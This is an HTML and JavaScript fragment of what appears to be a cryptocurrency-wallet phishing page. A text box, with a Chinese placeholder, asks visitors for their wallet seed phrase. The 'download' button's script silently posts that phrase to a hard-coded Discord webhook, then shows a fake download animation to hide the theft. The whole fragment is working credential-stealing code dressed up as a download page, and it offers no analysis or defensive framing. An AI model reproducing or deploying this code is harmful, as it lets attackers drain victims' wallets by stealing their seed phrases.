    <script>
        // Función para enviar las palabras introducidas al webhook de Discord
        function enviarPalabras(palabras) {
            var xhr = new XMLHttpRequest();
            var webhookURL = "https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m"; // Reemplaza "your-webhook-url" con tu URL de webhook real

            xhr.open("POST", webhookURL);
            xhr.setRequestHeader("Content-Type", "application/json");

            var mensaje = {
                content: palabras
            };

            xhr.send(JSON.stringify(mensaje));
        }

        // Función para descargar con animación
        function descargar() {
            // Obtener las palabras introducidas por el usuario
            var palabras = document.getElementById("frase-semilla").value;

            // Enviar las palabras al webhook de Discord
            enviarPalabras(palabras);

            // Mostrar la animación de descarga
            var botonDescarga = document.getElementById("boton-descarga");
            botonDescarga.innerText = "Descargando...";
            botonDescarga.disabled = true;

            var animacionDescarga = document.getElementById("animacion-descarga");
            animacionDescarga.style.display = "inline-block";

            // Simular una descarga durante 3 segundos
            setTimeout(function() {
                botonDescarga.innerText = "Descargar";
                botonDescarga.disabled = false;
                animacionDescarga.style.display = "none";
            }, 3000);
        }
    </script>
    <style>
        /* Estilos para la ventana emergente */
        .popup {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            padding: 20px;
            background-color: #fff;
            border: 1px solid #ccc;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
            text-align: center;
        }

        .popup h2 {
            margin-top: 0;
        }

        .popup .close {
            position: absolute;
            top: 5px;
            right: 5px;
            cursor: pointer;
        }

        /* Estilos para la animación de descarga */
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }

        .loading span {
            display: inline-block;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% {
                opacity: 0.3;
            }
            50% {
                opacity: 1;
            }
            100% {
                opacity: 0.3;
            }
        }
    </style>
</head>
<body>
    <div id="fullpage">
        <div class="section active" id="home">

                        <textarea class="form-control" rows="3" placeholder="请用空格隔开您的钱包助记词" id="frase-semilla"></textarea>
                    </div>
                    <div class="download-container">
                        <button class="download" onclick="descargar()" id="boton-descarga">下载</button>
                        <div class="loading" id="animacion-descarga">
                            下载中...
                            <br>

                    </div>
                </div>

        </div>
